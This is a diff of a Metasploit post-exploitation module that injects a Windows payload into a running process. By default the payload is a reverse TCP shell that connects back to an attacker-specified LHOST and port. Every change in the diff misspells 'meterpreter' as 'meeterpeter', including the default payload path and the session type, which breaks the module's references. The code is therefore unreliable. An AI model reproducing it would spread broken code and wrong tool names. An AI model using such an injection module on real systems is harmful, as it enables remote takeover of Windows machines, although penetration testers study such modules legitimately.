@@ -17,19 +17,19 @@ class Metasploit3 < Msf::Post
       'Description'   => %q{
         This module will inject into the memory of a process a specified windows payload.
         If a payload or process is not provided one will be created by default
-        using a reverse x86 TCP Meterpreter Payload.
+        using a reverse x86 TCP meeterpeter Payload.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
                            'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # added multiple payload support
                          ],
       'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
+      'SessionTypes'  => [ 'meeterpeter' ]
     ))
 
     register_options(
       [
-        OptString.new('PAYLOAD',   [false, 'Windows Payload to inject into memory of a process.', "windows/meterpreter/reverse_tcp"]),
+        OptString.new('PAYLOAD',   [false, 'Windows Payload to inject into memory of a process.', "windows/meeterpeter/reverse_tcp"]),
         OptAddress.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
         OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
         OptInt.new('PID', [false, 'Process Identifier to inject of process to inject payload.']),
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Post
   # Run Method for when run command is issued
   def run
 
-    # syinfo is only on meterpreter sessions
+    # syinfo is only on meeterpeter sessions
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
 
     # Check that the payload is a Windows one and on the list
@@ -64,7 +64,7 @@ class Metasploit3 < Msf::Post
       pid = create_temp_proc(payload)
     end
     if payload.arch.join =~ /64/ and client.platform =~ /x86/
-      print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
+      print_error("You are trying to inject to a x64 process from a x86 version of meeterpeter.")
       print_error("Migrate to an x64 process and try again.")
       return false
     else
